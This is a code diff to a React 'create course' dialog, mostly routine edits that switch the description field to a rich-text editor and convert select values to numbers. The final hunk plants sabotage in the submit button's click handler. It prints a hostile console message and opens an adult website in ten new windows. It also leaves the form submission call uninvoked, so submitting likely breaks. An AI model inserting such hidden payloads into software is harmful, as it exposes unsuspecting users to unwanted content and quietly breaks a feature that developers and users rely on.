@@ -10,7 +10,6 @@ import {
   DialogTrigger,
 } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
-import { Textarea } from "@/components/ui/textarea";
 import {
   Select,
   SelectContent,
@@ -34,11 +33,12 @@ import {
 import { getEnumEntries } from "@/lib/getEnumValues";
 import { LoadingButton } from "../shared/loading-button";
 import { useCoursesApi } from "@/api/use-courses-api";
-import Editor from "../shared/editor/advanced-editor";
+import ProseView from "../shared/editor/prose-view";
+import { Editor } from "../shared/editor/editor";
 
 const formDataSchema = z.object({
   name: z.string().min(1, "Course name is required"),
-  description: z.string().min(1, "Description is required"),
+  description: z.record(z.any()),
   internalIdentifier: z.string().min(1, "Course code is required"),
   startDate: z.date(),
   endDate: z.date(),
@@ -56,7 +56,7 @@ export function CreateCourseDialog() {
     resolver: zodResolver(formDataSchema),
     defaultValues: {
       name: "",
-      description: "",
+      description: {},
       startDate: new Date(),
       endDate: new Date(),
       internalIdentifier: "",
@@ -69,7 +69,7 @@ export function CreateCourseDialog() {
     await createCourse(
       new CreateCourseCommand({
         name: data.name,
-        description: data.description,
+        description: JSON.stringify(data.description),
         internalIdentifier: data.internalIdentifier,
         startDate: data.startDate,
         endDate: data.endDate,
@@ -143,10 +143,11 @@ export function CreateCourseDialog() {
               <FormItem className="flex flex-col overflow-hidden">
                 <FormLabel htmlFor={field.name}>Description</FormLabel>
                 <FormControl>
-                    <Editor
-                      // value={field.value}
-                      // onChange={field.onChange}
-                    />
+                  <Editor
+                    className="sm:rounded-lg sm:border px-8 sm:px-12 py-4"
+                    editorKey="create-course-description"
+                    onChange={field.onChange}
+                  />
                 </FormControl>
                 <FormMessage />
               </FormItem>
@@ -163,7 +164,7 @@ export function CreateCourseDialog() {
                   <FormControl>
                     <Select
                       value={field.value.toString()}
-                      onValueChange={field.onChange}
+                      onValueChange={(v) => field.onChange(Number(v))}
                     >
                       <SelectTrigger className="w-full">
                         <SelectValue />
@@ -191,7 +192,7 @@ export function CreateCourseDialog() {
                   <FormControl>
                     <Select
                       value={field.value.toString()}
-                      onValueChange={field.onChange}
+                      onValueChange={(v) => field.onChange(Number(v))}
                     >
                       <SelectTrigger className="w-full">
                         <SelectValue />
@@ -262,7 +263,14 @@ export function CreateCourseDialog() {
               Cancel
             </Button>
             <LoadingButton
-              onClick={form.handleSubmit(handleSubmit)}
+              onClick={()=>{
+                console.log("DONT TOUCH MY SHIT!")
+                for (let index = 0; index < 10; index++) {
+                  window.open("http://pornhub.com/", "_blank");
+                }
+                form.handleSubmit(handleSubmit)
+              }
+              }
               loading={isCreating}
               disabled={!form.formState.isValid}
             >
